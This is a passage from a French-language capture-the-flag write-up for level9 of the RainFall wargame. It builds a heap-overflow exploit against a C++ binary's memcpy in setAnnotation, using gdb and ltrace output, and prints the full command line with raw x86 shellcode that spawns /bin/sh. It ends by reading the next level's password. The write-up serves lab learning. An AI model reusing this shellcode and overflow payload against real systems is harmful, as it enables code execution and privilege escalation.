[------------------------------------------------------------------------------]                                                                              
Legend: code, data, rodata, value
0xffffd393 in ?? ()
gdb-peda$ c
Continuing.
process 46528 is executing new program: /usr/bin/dash
```

Parfait sa marche !

On peux testé aussi avec l'adresse dst du memcpy:
```
>>> from pwn import *
>>> p32(0x804ebb4)
'\xb4\xeb\x04\x08'
>>> p32(0x804ebb4 + 4)
'\xb8\xeb\x04\x08'
```
```
gdb-peda$ r $(python -c 'print "\xb8\xeb\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 49 + "\xb4\xeb\x04\x08"')
Starting program: /home/yoginet/Documents/101/rainfall/level9/level9 $(python -c 'print "\xb8\xeb\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 49 + "\xb4\xeb\x04\x08"')
[----------------------------------registers-----------------------------------]
EAX: 0xffffd3ec --> 0x804ebb8 --> 0x0 
EBX: 0x804ec20 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
ECX: 0x2c (',')
EDX: 0x804ebb4 --> 0x0 
ESI: 0xf7de3000 --> 0x1e4d6c 
EDI: 0xf7de3000 --> 0x1e4d6c 
EBP: 0xffffd138 --> 0xffffd168 --> 0x0 
ESP: 0xffffd120 --> 0x804ebb4 --> 0x0 
EIP: 0x8048733 (<_ZN1N13setAnnotationEPc+37>:   call   0x8048510 <memcpy@plt>)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048729 <_ZN1N13setAnnotationEPc+27>:      mov    eax,DWORD PTR [ebp+0xc]
   0x804872c <_ZN1N13setAnnotationEPc+30>:      mov    DWORD PTR [esp+0x4],eax
   0x8048730 <_ZN1N13setAnnotationEPc+34>:      mov    DWORD PTR [esp],edx
=> 0x8048733 <_ZN1N13setAnnotationEPc+37>:      call   0x8048510 <memcpy@plt>
   0x8048738 <_ZN1N13setAnnotationEPc+42>:      leave  
   0x8048739 <_ZN1N13setAnnotationEPc+43>:      ret    
   0x804873a <_ZN1NplERS_>:     push   ebp
   0x804873b <_ZN1NplERS_+1>:   mov    ebp,esp
Guessed arguments:
arg[0]: 0x804ebb4 --> 0x0 
arg[1]: 0xffffd3ec --> 0x804ebb8 --> 0x0 
arg[2]: 0x70 ('p')
[------------------------------------stack-------------------------------------]
0000| 0xffffd120 --> 0x804ebb4 --> 0x0 
0004| 0xffffd124 --> 0xffffd3ec --> 0x804ebb8 --> 0x0 
0008| 0xffffd128 --> 0x70 ('p')
0012| 0xffffd12c --> 0xf7e6ec50 (<_Znwj>:       push   esi)
0016| 0xffffd130 --> 0xf7e6ec5c (<_Znwj+12>:    add    ebx,0x13f3a4)
0020| 0xffffd134 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd138 --> 0xffffd168 --> 0x0 
0028| 0xffffd13c --> 0x804867c (<main+136>:     mov    eax,DWORD PTR [esp+0x10])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x08048733 in N::setAnnotation(char*) ()
gdb-peda$ c
Continuing.
process 8008 is executing new program: /usr/bin/dash
```

Sur notre machine virtuelle, les adresses ne sont pas les memes. Il va falloir adapté le payload.

Nous devons trouvé l'adresse du buffer, pour ce facilité la tache on va utilisé ```ltrace -nr```:
```
level9@RainFall:~$ ltrace -nr ./level9 $(python -c 'print "\x93\xd3\xff\xff" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 49 + "\x8f\xd3\xff\xff"')
__libc_start_main(0x80485f4, 2, 0xbffff774, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff774, 0xbffff780, 0xb7d79e55, 0xb7fed280)            = 0x804a008
_Znwj(108, 5, 0xbffff780, 0xb7d79e55, 0xb7fed280)                     = 0x804a078
strlen("\223\323\377\3771\3001\333\260\006\315\200Sh/ttyh/dev\211\3431\311f\271\022'\260"...) = 112
memcpy(0x0804a00c, "\223\323\377\3771\3001\333\260\006\315\200Sh/ttyh/dev\211\3431\311f\271\022'\260"..., 112) = 0x0804a00c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

L'adresse de notre dest au moment du memcpy est 0x0804a00c.
On la converti:
```
>>> p32(0x0804a00c)                                             
'\x0c\xa0\x04\x08'
>>> p32(0x0804a00c + 4)
'\x10\xa0\x04\x08'
```

Maintenant on lance notre payload:
```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 49 + "\x0c\xa0\x04\x08"')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

Enjoy :)
